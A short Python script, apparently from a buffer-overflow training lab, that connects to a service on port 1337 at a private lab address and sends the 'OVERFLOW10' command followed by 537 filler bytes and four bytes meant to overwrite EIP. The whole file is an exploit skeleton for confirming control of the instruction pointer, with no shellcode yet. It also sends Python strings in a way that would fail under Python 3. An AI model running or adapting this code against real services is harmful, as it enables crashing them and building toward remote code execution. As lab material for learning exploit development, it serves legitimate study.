#!/usr/bin/python3

import sys, socket
from time import sleep

command = "OVERFLOW10 "
filler = "A" * 537
EIP = "B" * 4
#offset = "C" * 4
buffer = command + filler + EIP


try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("10.10.61.30",1337))
    s.recv(1024)
    s.send(buffer + "\r\n")
    s.close()

except:
   print("Application crashed")
   sys.exit()